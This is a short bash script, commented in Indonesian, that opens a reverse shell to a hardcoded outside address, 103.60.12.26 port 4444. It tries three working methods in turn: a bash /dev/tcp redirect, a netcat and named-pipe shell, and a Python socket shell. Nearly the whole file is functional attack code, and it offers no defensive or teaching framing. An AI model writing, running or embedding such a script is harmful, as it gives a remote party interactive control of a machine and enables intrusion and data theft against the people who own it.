#!/bin/bash

# =============================================
# Reverse Shell ke 103.60.12.26:4444
# =============================================

TARGET_IP="103.60.12.26"
TARGET_PORT="4444"

echo "[+] Starting Reverse Shell to ${TARGET_IP}:${TARGET_PORT}"

# Method 1: Bash TCP (Paling Simpel)
bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1

# Kalau di atas gagal, coba method lain (fallback)
if [ $? -ne 0 ]; then
    echo "[!] Bash TCP gagal, mencoba metode lain..."

    # Method 2: Netcat + FIFO (sangat stabil)
    rm -f /tmp/f; mkfifo /tmp/f
    cat /tmp/f | /bin/sh -i 2>&1 | nc ${TARGET_IP} ${TARGET_PORT} > /tmp/f

    # Method 3: Python (jika ada)
    python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('${TARGET_IP}',${TARGET_PORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
" 2>/dev/null
fi
